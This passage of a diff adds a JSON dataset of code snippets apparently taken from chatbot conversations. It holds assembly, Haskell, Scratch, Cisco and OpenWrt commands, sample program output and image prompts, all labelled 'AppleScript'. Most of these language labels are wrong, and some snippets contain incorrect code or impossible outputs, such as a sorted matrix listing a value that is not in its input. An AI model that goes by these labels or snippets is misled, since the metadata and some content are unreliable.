@@ -1,0 +1,1572 @@
+[
+  {
+    "conversation_hash": "81faee83e2182f18e218f1f1e4d99d64",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- define a sphere shape with a radius of 50 and 20 segments\nset the style3d of shape \"sphere\" to \"solid\"\nset the radius of shape \"sphere\" to 50\nset the segments of shape \"sphere\" to 20\n\n-- set the color of the sphere to red\nset the outercolor of shape \"sphere\" to \"red\"\n\n-- position the sphere in the center of the card\nset the loc of shape \"sphere\" to the center of this card",
+    "filename": "81faee83e2182f18e218f1f1e4d99d64_0.applescript"
+  },
+  {
+    "conversation_hash": "81faee83e2182f18e218f1f1e4d99d64",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- define a sphere shape with a radius of 50 and 20 segments\nset the style of shape \"sphere\" to \"3D\"\nset the radius of shape \"sphere\" to 50\nset the segments of shape \"sphere\" to 20\n\n-- set the color of the sphere to red\nset the outercolor of shape \"sphere\" to \"red\"\n\n-- position the sphere in the center of the card\nset the loc of shape \"sphere\" to the center of this card",
+    "filename": "81faee83e2182f18e218f1f1e4d99d64_1.applescript"
+  },
+  {
+    "conversation_hash": "2a2088ebffa7dbe99d47b8e7538fe4a4",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "mov ax, 10     ; move value 10 into ax register\nmov bx, 5      ; move value 5 into bx register\n\ncmp ax, bx     ; compare ax and bx registers\njg greater     ; jump to label greater if ax > bx\njl lesser      ; jump to label lesser if ax < bx\nje equal       ; jump to label equal if ax = bx\n\ngreater:\nmov cx, 1      ; set cx register to 1\njmp end        ; jump to end of program\n\nlesser:\nmov cx, -1     ; set cx register to -1\njmp end        ; jump to end of program\n\nequal:\nmov cx, 0      ; set cx register to 0\n\nend:\n; continue with remaining code",
+    "filename": "2a2088ebffa7dbe99d47b8e7538fe4a4_0.applescript"
+  },
+  {
+    "conversation_hash": "76b2489c3f102cd1c48d27adae5a1c39",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "cd ltp\n   make autotools\n   ./configure\n   make\n   sudo make install",
+    "filename": "76b2489c3f102cd1c48d27adae5a1c39_2.applescript"
+  },
+  {
+    "conversation_hash": "cfabe49fcbc6aaca5c325ae3b55ca2f0",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Enter name of candidate 1: John Doe\nEnter marks for Math (out of 100): 90\nEnter marks for Science (out of 100): 85\nEnter marks for English (out of 100): 80\nEnter marks for History (out of 100): 95\nEnter marks for Art (out of 100): 90\n\nEnter name of candidate 2: Jane Doe\nEnter marks for Math (out of 100): 80\nEnter marks for Science (out of 100): 85\nEnter marks for English (out of 100): 70\nEnter marks for History (out of 100): 75\nEnter marks for Art (out of 100): 60\n\nEnter name of candidate 3: Bob Smith\nEnter marks for Math (out of 100): 60\nEnter marks for Science (out of 100): 50\nEnter marks for English (out of 100): 70\nEnter marks for History (out of 100): 65\nEnter marks for Art (out of 100): 80\n\nEnter name of candidate 4: Alice Wilson\nEnter marks for Math (out of 100): 95\nEnter marks for Science (out of 100): 90\nEnter marks for English (out of 100): 90\nEnter marks for History (out of 100): 90\nEnter marks for Art (out of 100): 95\n\nEnter name of candidate 5: Tom Johnson\nEnter marks for Math (out of 100): 80\nEnter marks for Science (out of 100): 85\nEnter marks for English (out of 100): 70\nEnter marks for History (out of 100): 75\nEnter marks for Art (out of 100): 60\n\nEnter name of candidate 6: Mary Brown\nEnter marks for Math (out of 100): 60\nEnter marks for Science (out of 100): 65\nEnter marks for English (out of 100): 75\nEnter marks for History (out of 100): 70\nEnter marks for Art (out of 100): 80\n\nEnter name of candidate 7: Joe Thomas\nEnter marks for Math (out of 100): 75\nEnter marks for Science (out of 100): 80\nEnter marks for English (out of 100): 65\nEnter marks for History (out of 100): 70\nEnter marks for Art (out of 100): 60\n\nEnter name of candidate 8: Amy Johnson\nEnter marks for Math (out of 100): 95\nEnter marks for Science (out of 100): 90\nEnter marks for English (out of 100): 90\nEnter marks for History (out of 100): 90\nEnter marks for Art (out of 100): 95\n\nEnter name of candidate 9: Bob Brown\nEnter marks for Math (out of 100): 60\nEnter marks for Science (out of 100): 65\nEnter marks for English (out of 100): 75\nEnter marks for History (out of 100): 70\nEnter marks for Art (out of 100): 80\n\nEnter name of candidate 10: Sarah Lee\nEnter marks for Math (out of 100): 70\nEnter marks for Science (out of 100): 75\nEnter marks for English (out of 100): 60\nEnter marks for History (out of 100): 55\nEnter marks for Art (out of 100): 50\n\nCandidate\tMath\tScience\tEnglish\tHistory\tArt\t\nJohn Doe\tMAT90(A)\tSCI85(B)\tENG80(B)\tHIS95(A)\tART90(A)\t\nJane Doe\tMAT80(B)\tSCI85(B)\tENG70(C)\tHIS75(C)\tART60(D)\t\nBob Smith\tMAT60(D)\tSCI50(F)\tENG70(C)\tHIS65(D)\tART80(B)\t\nAlice Wilson\tMAT95(A)\tSCI90(A)\tENG90(A)\tHIS90(A)\tART95(A)\t\nTom Johnson\tMAT80(B)\tSCI85(B)\tENG70(C)\tHIS75(C)\tART60(D)\t\nMary Brown\tMAT60(D)\tSCI65(D)\tENG75(C)\tHIS70(C)\tART80(B)\t\nJoe Thomas\tMAT75(C)\tSCI80(B)\tENG65(D)\tHIS70(C)\tART60(D)\t\nAmy Johnson\tMAT95(A)\tSCI90(A)\tENG90(A)\tHIS90(A)\tART95(A)\t\nBob Brown\tMAT60(D)\tSCI65(D)\tENG75(C)\tHIS70(C)\tART80(B)\t\nSarah Lee\tMAT70(C)\tSCI75(C)\tENG60(D)\tHIS55(F)\tART50(F)",
+    "filename": "cfabe49fcbc6aaca5c325ae3b55ca2f0_1.applescript"
+  },
+  {
+    "conversation_hash": "cb3bca1414b56296938b985888a27043",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "sub main\n    dim doc, sheet, cell as object\n    dim riga as integer   \n    doc = ThisComponent\n    sheet = doc.sheets.getByName(\"Foglio1\") 'sheet=doc.sheets(0) primo foglio (sintassi analoga ad array)\n    'inizializza(sheet) inutile se ci sono già dei dati nel foglio\n    riga = 6 'assumo che si voglia inserire il nuovo cliente nella sesta riga\n    inserisciConto(sheet, riga)\nend sub\n\nsub inserisciConto(sheet as object, riga as integer)\n    'inserire i dati del nuovo cliente nelle celle della riga specificata\n    sheet.getCellByPosition(0, riga).string = InputBox(\"Inserisci il cognome\",\"Nuovo conto\")\n    sheet.getCellByPosition(1, riga).string = InputBox(\"Inserisci il nome\",\"Nuovo conto\")\n    sheet.getCellByPosition(2, riga).string = InputBox(\"Inserisci il codice fiscale\",\"Nuovo conto\")\n    sheet.getCellByPosition(3, riga).string = InputBox(\"Inserisci l'indirizzo\",\"Nuovo conto\")\n    sheet.getCellByPosition(4, riga).string = InputBox(\"Inserisci il comune\",\"Nuovo conto\")\n    sheet.getCellByPosition(5, riga).string = InputBox(\"Inserisci la provincia\",\"Nuovo conto\")\n    sheet.getCellByPosition(6, riga).string = InputBox(\"Inserisci il telefono\",\"Nuovo conto\")\n    sheet.getCellByPosition(7, riga).string = InputBox(\"Inserisci l'anno apertura conto\",\"Nuovo conto\")\n    sheet.getCellByPosition(8, riga).string = InputBox(\"Inserisci il saldo\",\"Nuovo conto\")\nend sub",
+    "filename": "cb3bca1414b56296938b985888a27043_0.applescript"
+  },
+  {
+    "conversation_hash": "8fac0542533c3ba0d36a592a248e68ed",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "/imagine prompt: A dark horror scene with a cursed castle, surrounded by graveyards and dark forests. The moon is full and \ncasts an ominous light on the scene, as a thick mist covers the ground. There is a great sense of eeriness as one approaches \nthe castle, with sharp angles and jagged edges in the architecture. The colour palate is muted and oppressive, with a feeling \nof claustrophobia pervading the image. The mood is one of dread and fear, capturing the inherent malevolence of the castle and \nthe danger that lurks within --ar 16:9 --v 5 --q 2",
+    "filename": "8fac0542533c3ba0d36a592a248e68ed_0.applescript"
+  },
+  {
+    "conversation_hash": "8fac0542533c3ba0d36a592a248e68ed",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "/imagine prompt: A haunted house, with a sinister and menacing presence, sits on the edge of a dark forest. The moon is \nhidden behind thick clouds, and a storm is brewing in the distance. The house is old and decrepit, with vines crawling up \nthe sides and creaking shutters. The shadows are deep and foreboding, with glimpses of movement hidden in the darkness. The \nartistic style should be detailed and intricate, with a sense of depth and twisted architecture. The mood is one of terror \nand apprehension, capturing the feeling of being alone and vulnerable in the face of great evil --ar 16:9 --v 5 --q 2",
+    "filename": "8fac0542533c3ba0d36a592a248e68ed_1.applescript"
+  },
+  {
+    "conversation_hash": "d30f7d08f9e72c313f757dde04185a7a",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on run {input, parameters}\n\ttell application \"System Events\"\n\t\ttell current location of network preferences\n\t\t\tset proxies to {enabled: true,  mode: 1,  address: \"<YOUR_SOCKS_SERVER>\", port: <YOUR_SOCKS_PORT>}\n\t\t\tset the proxy of the current configuration to proxies\n\t\tend tell\n\tend tell\n\treturn input\nend run",
+    "filename": "d30f7d08f9e72c313f757dde04185a7a_0.applescript"
+  },
+  {
+    "conversation_hash": "996c8422c554e7170b3239f5e69a3262",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "applescript\ntell application \"Finder\"\n    activate\n    make new Finder window\nend tell",
+    "filename": "996c8422c554e7170b3239f5e69a3262_0.applescript"
+  },
+  {
+    "conversation_hash": "f4c921ada6eee6dbed77b42d004b7318",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Ejercicio 1\nnombresDeUsuarios :: RedSocial -> [String]\nnombresDeUsuarios red = map nombreDeUsuario (usuarios red)\n\n-- Ejercicio 2\namigosDe :: RedSocial -> Usuario -> [Usuario]\namigosDe red u = [v | (u', v) <- relaciones red, u' == u] ++ [u' | (u', v) <- relaciones red, v == u]\n\n-- Ejercicio 3\ncantidadDeAmigos :: RedSocial -> Usuario -> Int\ncantidadDeAmigos red u = length (amigosDe red u)\n\n-- Ejercicio 4\nusuarioConMasAmigos :: RedSocial -> Usuario\nusuarioConMasAmigos red = maximumBy (comparing (cantidadDeAmigos red)) (usuarios red)\n\n-- Ejercicio 5\nestaRobertoCarlos :: RedSocial -> Bool\nestaRobertoCarlos red = any (\\u -> cantidadDeAmigos red u > 1000000) (usuarios red)\n\n-- Ejercicio 6\npublicacionesDe :: RedSocial -> Usuario -> [Publicacion]\npublicacionesDe red u = filter (\\pub -> usuarioDePublicacion pub == u) (publicaciones red)\n\n-- Ejercicio 7\npublicacionesQueLeGustanA :: RedSocial -> Usuario -> [Publicacion]\npublicacionesQueLeGustanA red u = filter (\\pub -> u `elem` likesDePublicacion pub) (publicaciones red)\n\n-- Ejercicio 8\nlesGustanLasMismasPublicaciones :: RedSocial -> Usuario -> Usuario -> Bool\nlesGustanLasMismasPublicaciones red u1 u2 = publicacionesQueLeGustanA red u1 == publicacionesQueLeGustanA red u2\n\n-- Ejercicio 9\ntieneUnSeguidorFiel :: RedSocial -> Usuario -> Bool\ntieneUnSeguidorFiel red u = any (\\u2 -> u /= u2 && all (\\pub -> u2 `elem` likesDePublicacion pub) (publicacionesDe red u)) (usuarios red)\n\n-- Ejercicio 10\nexisteSecuenciaDeAmigos :: RedSocial -> Usuario -> Usuario -> Bool\nexisteSecuenciaDeAmigos red u1 u2 = existeCamino (relaciones red) u1 u2\n  where\n    existeCamino :: [Relacion] -> Usuario -> Usuario -> Bool\n    existeCamino _ u1 u2 | u1 == u2 = True\n    existeCamino rels u1 u2 = any (\\v -> existeCamino (delete (u1, v) rels) v u2) (amigosDe red u1)",
+    "filename": "f4c921ada6eee6dbed77b42d004b7318_0.applescript"
+  },
+  {
+    "conversation_hash": "c2e65a762656334391f23088adc186f6",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on openCard\n  set the lockText of fld \"<your field name>\" to true\n  set the textFont of fld \"<your field name>\" to \"Arial\" /* or any font you like */\n  set the textSize of fld \"<your field name>\" to 16 /* or any size you like */\n  set the bullet of fld \"<your field name>\" to true\nend openCard",
+    "filename": "c2e65a762656334391f23088adc186f6_4.applescript"
+  },
+  {
+    "conversation_hash": "c2e65a762656334391f23088adc186f6",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on keyDown\n   put the rawKeyDown into fld \"passwordField\"\n   set the text of fld \"maskedField\" to repeat(\"*\", the number of chars of fld \"passwordField\")\n   pass keyDown\nend keyDown\n\non keyUp\n   put the rawKeyDown into fld \"passwordField\"\n   set the text of fld \"maskedField\" to repeat(\"*\", the number of chars of fld \"passwordField\")\n   pass keyUp\nend keyUp",
+    "filename": "c2e65a762656334391f23088adc186f6_5.applescript"
+  },
+  {
+    "conversation_hash": "2834054739490e481a01fafad60bf75d",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on run\n    tell application \"Safari\"\n        activate\n        open location \"URL\"\n    end tell\nend run",
+    "filename": "2834054739490e481a01fafad60bf75d_0.applescript"
+  },
+  {
+    "conversation_hash": "19d89a0c6ad1506149f395e1fe4c2b25",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  if <key (up arrow) pressed?>\n    change y by (10)\n  endif\n  if <key (down arrow) pressed?>\n    change y by (-10)\n  endif\n  if <key (right arrow) pressed?>\n    change x by (10)\n  endif\n  if <key (left arrow) pressed?>\n    change x by (-10)\n  endif\nend",
+    "filename": "19d89a0c6ad1506149f395e1fe4c2b25_0.applescript"
+  },
+  {
+    "conversation_hash": "19d89a0c6ad1506149f395e1fe4c2b25",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  go to x: (pick random (-240) to (240)) y: (pick random (-180) to (180))\n  point towards [Player v]\n  move (5) steps\n  wait (2) seconds\nend",
+    "filename": "19d89a0c6ad1506149f395e1fe4c2b25_1.applescript"
+  },
+  {
+    "conversation_hash": "19d89a0c6ad1506149f395e1fe4c2b25",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [Score v] to [0]\nforever\n  wait (1) seconds\n  change [Score v] by (1)\nend",
+    "filename": "19d89a0c6ad1506149f395e1fe4c2b25_3.applescript"
+  },
+  {
+    "conversation_hash": "a6114913076879c516aa4a8388bd7056",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [number v] to (pick random (1) to (100))\nif <(number) > (50)> then\n  say [Number is greater than 50!]\nelse if <(number) > (25)> then\n  say [Number is between 26 and 50!]\nelse\n  say [Number is less than 26!]\nend",
+    "filename": "a6114913076879c516aa4a8388bd7056_0.applescript"
+  },
+  {
+    "conversation_hash": "60750089c771db628430693ef8fb8893",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Dataframe before removing columns:\n   x  y   z\n0  1  5   9\n1  2  6  10\n2  3  7  11\n3  4  8  12\nDataframe after removing columns:\n    z\n0   9\n1  10\n2  11\n3  12",
+    "filename": "60750089c771db628430693ef8fb8893_3.applescript"
+  },
+  {
+    "conversation_hash": "2e43fc621c08f46934622accfffff99e",
+    "code_index": 7,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "No LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 20.04.2 LTS\nRelease:        20.04\nCodename:       focal",
+    "filename": "2e43fc621c08f46934622accfffff99e_7.applescript"
+  },
+  {
+    "conversation_hash": "e8c58c5e31ae606ff5a10783091064d2",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set default=0\nset timeout=0\n\nmenuentry \"My OS\" {\n    multiboot /boot/kernel.bin\n    boot\n}",
+    "filename": "e8c58c5e31ae606ff5a10783091064d2_3.applescript"
+  },
+  {
+    "conversation_hash": "6a522cfd62c26ce5884de4f31dc89971",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Enter the dimensions of the matrix (n, m): 5 3\nMatrix:\n63 10 40\n95 26 29\n62 96 39\n16 22 68\n75 28 75\nSorted matrix:\n10 16 22\n28 29 39\n40 62 63\n68 75 75\n95 96 97\nSpiral printed sorted matrix:\n10 16 22 39 75 75 97 96 95 68 40 28 29 62 63 10 28 22 75 29 62 39 16 75",
+    "filename": "6a522cfd62c26ce5884de4f31dc89971_4.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n      configure terminal\n      vlan 10\n      name VLAN10\n      vlan 14\n      name VLAN14\n      vlan 80\n      name VLAN80\n      exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_0.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "interface FastEthernet0/24 (заменить на нужные номера порта для R0)\n      switchport trunk encapsulation dot1q\n      switchport mode trunk\n      switchport trunk native vlan 80\n      exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_2.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n      configure terminal\n      interface FastEthernet0/0.10 (замените на подходящий номер интерфейса для маршрутизатора R0 и коммутатора S0)\n      encapsulation dot1q 10\n      ip address 192.168.0.9 255.255.255.248\n      exit\n      interface FastEthernet0/0.14\n      encapsulation dot1q 14\n      ip address 192.168.0.17 255.255.255.248\n      exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_3.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n configure terminal\n interface FastEthernet0/1 (замените на соответствующий номер интерфейса для R2)\n ip address 192.168.0.50 255.255.255.248\n no shutdown\n exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_6.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 8,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n configure terminal\n interface FastEthernet0/1 (Замените на соответствующий номер интерфейса для R2)\n ip address 192.168.0.57 255.255.255.248\n no shutdown\n exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_8.applescript"
+  },
+  {
+    "conversation_hash": "6d7ec262ae7e58999b8b252d4b6d4c87",
+    "code_index": 10,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n configure terminal\n interface FastEthernet 0/0 (замените на нужный номер интерфейса для R0)\n ip address 192.168.0.49 255.255.255.248\n no shutdown\n exit\n interface FastEthernet 0/1 (замените на нужный номер интерфейса для R1)\n ip address 192.168.0.58 255.255.255.248\n no shutdown\n exit\n interface FastEthernet 0/2 (замените на нужный номер интерфейса для PC-C)\n ip address 192.168.0.30 255.255.255.248\n no shutdown\n exit",
+    "filename": "6d7ec262ae7e58999b8b252d4b6d4c87_10.applescript"
+  },
+  {
+    "conversation_hash": "c11734821c30781793bd172a702df4db",
+    "code_index": 8,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "username hard as 20000\nusername soft as 10000\n@group hard as 20000\n@group soft as 10000\n@group hard rss 20000\n@group soft rss 10000",
+    "filename": "c11734821c30781793bd172a702df4db_8.applescript"
+  },
+  {
+    "conversation_hash": "2023a7cd01ba56735dfb3bdc621b44d6",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "List of length 3: [6, 5, 2]\nList of length 6: [7, 5, 7, 5, 2, 4]\nList of length 12: [5, 2, 7, 2, 6, 5, 4, 5, 4, 3, 7, 5]\nList of length 21: [2, 4, 5, 2, 6, 3, 6, 7, 7, 2, 5, 2, 6, 2, 6, 6, 2, 2, 3, 5, 6]\nList of length 20: [4, 6, 5, 7, 3, 3, 5, 2, 6, 5, 6, 3, 5, 4, 6, 3, 6, 4, 6, 3]",
+    "filename": "2023a7cd01ba56735dfb3bdc621b44d6_5.applescript"
+  },
+  {
+    "conversation_hash": "2023a7cd01ba56735dfb3bdc621b44d6",
+    "code_index": 7,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "List of length 3: [6, 5, 2]\nList of length 6: [7, 5, 7, 5, 2, 4]\nList of length 12: [5, 2, 7, 2, 6, 5, 4, 5, 4, 3, 7, 5]\nList of length 21: [2, 4, 5, 2, 6, 3, 6, 7, 7, 2, 5, 2, 6, 2, 6, 6, 2, 2, 3, 5, 6]\nList of length 20: [6, 7, 3, 6, 4, 7, 3, 7, 5, 6, 7, 2, 4, 4, 4, 5, 7, 6, 4, 3]",
+    "filename": "2023a7cd01ba56735dfb3bdc621b44d6_7.applescript"
+  },
+  {
+    "conversation_hash": "59a859c254ea99d698495499aaffc94d",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "> use mydatabase\nswitched to db mydatabase\n> show collections\nbooks\nmovies\nusers",
+    "filename": "59a859c254ea99d698495499aaffc94d_3.applescript"
+  },
+  {
+    "conversation_hash": "4e99b47c2941057861b34e3a18d74063",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked \n      set [move_speed v] to [5]\n      forever\n         if <key (right arrow v) pressed?>\n            change x by (move_speed)\n         end\n         if <key (left arrow v) pressed?>\n            change x by (-1 * move_speed)\n         end\n         if <key (up arrow v) pressed?>\n            change y by (move_speed)\n         end\n         if <key (down arrow v) pressed?>\n            change y by (-1 * move_speed)\n         end\n      end",
+    "filename": "4e99b47c2941057861b34e3a18d74063_0.applescript"
+  },
+  {
+    "conversation_hash": "df5238a3fbc21fba131059a0bf224cfe",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  move (ball-speed-x) steps\n  move (ball-speed-y) steps\n  if touching edge\n    set ball-speed-y to (ball-speed-y * -1)\n  end\n  if touching [paddle1 v] or touching [paddle2 v]\n    set ball-speed-x to (ball-speed-x * -1)\n  end\nend",
+    "filename": "df5238a3fbc21fba131059a0bf224cfe_0.applescript"
+  },
+  {
+    "conversation_hash": "df5238a3fbc21fba131059a0bf224cfe",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset score1 to 0\nset score2 to 0\n\nforever\n  if touching color [#ff0000] or touching color [#00ff00]\n    if x position < 0\n      change score2 by 1\n      go to x: (0) y: (0)\n    else\n      change score1 by 1\n      go to x: (0) y: (0)\n    end\n    set ball-speed-x to (ball-speed-x * -1)\n  end\nend",
+    "filename": "df5238a3fbc21fba131059a0bf224cfe_1.applescript"
+  },
+  {
+    "conversation_hash": "f1d30065383673f79b8cf448cf218131",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Enter the number of vertices: 5\nEnter the number of edges: 6\nEnter edge 1: 0 1\nEnter edge 2: 1 2\nEnter edge 3: 2 3\nEnter edge 4: 3 4\nEnter edge 5: 4 0\nEnter edge 6: 1 4\nAdjacency list of vertex 0: 1 \nAdjacency list of vertex 1: 4 2 \nAdjacency list of vertex 2: 3 \nAdjacency list of vertex 3: 4 \nAdjacency list of vertex 4: 0",
+    "filename": "f1d30065383673f79b8cf448cf218131_3.applescript"
+  },
+  {
+    "conversation_hash": "fb514a2a2584f77db744280a43d2ac50",
+    "code_index": 10,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "uci set wireless.default_radio0.disabled=0\n   uci set wireless.default_radio0.ssid=MyNetwork\n   uci set wireless.default_radio0.mode=ap\n   uci set wireless.default_radio0.network=lan\n   uci set wireless.default_radio0.encryption=psk2\n   uci set wireless.default_radio0.key=password\n   uci set wireless.default_radio0.wps_pushbutton=1\n   uci set wireless.default_radio0.wps_label=1\n   uci add_list wireless.default_radio0.wps_config_methods=VirtualPushbutton\n   uci add_list wireless.default_radio0.wps_config_methods=VirtualDisplayPIN\n   uci commit wireless",
+    "filename": "fb514a2a2584f77db744280a43d2ac50_10.applescript"
+  },
+  {
+    "conversation_hash": "81647ff0af2dbcbc5cf2412d697515d3",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Create an empty Python list called \"samples\"\nFor each sample in the range of 1 to 10\n    Take a sample\n    Append the sample to the \"samples\" list\n    Wait for 1 second\nEnd for",
+    "filename": "81647ff0af2dbcbc5cf2412d697515d3_0.applescript"
+  },
+  {
+    "conversation_hash": "6ecd311fc1e503f429feedd1aafa536f",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Dimmer lamp switched on\nVoice command processed: turn on the light\nSetting brightness to 50\nVoice command processed: set brightness to 50\nColor changing lamp switched on",
+    "filename": "6ecd311fc1e503f429feedd1aafa536f_3.applescript"
+  },
+  {
+    "conversation_hash": "c52d43acf5f8054929176c0c11fd814f",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "MOV CX, 0          ; set CX to zero\nCMP AX, BX         ; compare AX and BX\nJL smaller         ; jump to smaller if AX is less than BX\nJG larger          ; jump to larger if AX is greater than BX\nJMP equal          ; jump to equal if AX is equal to BX\n\nsmaller:\n    MOV CX, 1      ; set CX to 1 if AX is smaller than BX\n    JMP end\n\nlarger:\n    MOV CX, -1     ; set CX to -1 if AX is larger than BX\n    JMP end\n\nequal:\n    MOV CX, 0      ; set CX to 0 if AX and BX are equal\n\nend:\n    ; result is now stored in register CX",
+    "filename": "c52d43acf5f8054929176c0c11fd814f_0.applescript"
+  },
+  {
+    "conversation_hash": "a75545b5a6f3931a44840d7a56d73bac",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on run {input, parameters}\n    tell application \"Google Chrome\"\n        activate\n        open location \"https://metamask.io\" -- Replace this URL with the website you want to open.\n    end tell\n    return input\nend run",
+    "filename": "a75545b5a6f3931a44840d7a56d73bac_0.applescript"
+  },
+  {
+    "conversation_hash": "74556f3518743ba5fb5ba69bc8e485a7",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "open  high   low  close  volume\ndatetime                                           \n2022-01-01 09:30:00  100  101  99.5    100  10000\n2022-01-01 09:35:00  101  102  99.5    101  12000\n2022-01-01 09:40:00  101  105  99.5    105  20000\n2022-01-01 09:45:00  105  106  99.5    106  15000\n2022-01-01 09:50:00  106  107  99.5    107  18000",
+    "filename": "74556f3518743ba5fb5ba69bc8e485a7_3.applescript"
+  },
+  {
+    "conversation_hash": "c5cf4dc7285e588be453307900c421ee",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "uci set network.wan.authentication='8021x'\nuci set network.wan.eap_type='peap'\nuci set network.wan.phase2='auth=MSCHAPV2'\nuci set network.wan.identity='<你的用户名>'\nuci set network.wan.password='<你的密码>'\n...",
+    "filename": "c5cf4dc7285e588be453307900c421ee_1.applescript"
+  },
+  {
+    "conversation_hash": "c346b7a7b65697b8c128edcc91b3b2d9",
+    "code_index": 13,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "options:\n  countdown_1: 30 # Задержка с 1 до 15 игроков\n  countdown_2: 45 # Задержка с 16 до 228 игроков\n  itemGivenDisplayTime: 1\n\ncommand /random <text>:\n  description: Включает или отключает получение случайных предметов\n  usage: /random (on|off)\n  trigger:\n    if arg 1 is \"off\":\n      set {random.%player%} to false\n      send \"&cВы отключили рандомные предметы\" to player's action bar for 5 seconds\n    else if arg 1 is \"on\":\n      set {random.%player%} to true\n      send \"&aВы включили рандомные предметы\" to player's action bar for 5 seconds\n    else:\n      send \"Используйте &c/random (on|off)&f для включения или отключения рандомных предметов.\"\n\nevery 1 second:\n  loop all players:\n    if {random.%loop-player%} is not false:\n      set {_player_count} to size of all players\n\n      # Устанавливаем задержку в зависимости от количества игроков\n      if {_player_count} <= 15:\n        set {_countdown} to {@countdown_1}\n      else if {_player_count} <= 228:\n        set {_countdown} to {@countdown_2}\n      else:\n        stop\n\n      # Отсюда идет остальной код\n      if {timer.%loop-player%} is not set:\n        set {timer.%loop-player%} to 0\n      if {changed.%loop-player%} is not set:\n        set {changed.%loop-player%} to 0\n\n      if {timer.%loop-player%} is not {_countdown}:\n        if {changed.%loop-player%} <= 0:\n          send action bar \"&x&8&d&f&b&0&0⛏ ᴘᴀʜдᴏᴍ пᴘᴇдмᴇт: &f%{_countdown} - {timer.%loop-player%}% ᴄᴇᴋyʜд\" to loop-player\n        else:\n          subtract 1 from {changed.%loop-player%}\n      else:\n        set {timer.%loop-player%} to 0\n        set {changed.%loop-player%} to {@itemGivenDisplayTime}\n\n        give random item out of all items to loop-player\n        send action bar \"&7(&x&8&d&f&b&0&0☘&7) &aʙᴀм ʙыдᴀʜ ʜᴏʙый пᴘᴇдмᴇт\" to loop-player\n        play sound \"ENTITY_ITEM_PICKUP\" with volume 1 and pitch 1 to loop-player\n\n      add 1 to {timer.%loop-player%}",
+    "filename": "c346b7a7b65697b8c128edcc91b3b2d9_13.applescript"
+  },
+  {
+    "conversation_hash": "0978e4945d4faaa41cb876fa64c254a9",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "project \"myapp\"\n    dependson \"foo\"\n    language \"C++\"\n\n    -- 添加依赖库的头文件路径\n    filter \"system:windows\"\n        add_foo()",
+    "filename": "0978e4945d4faaa41cb876fa64c254a9_6.applescript"
+  },
+  {
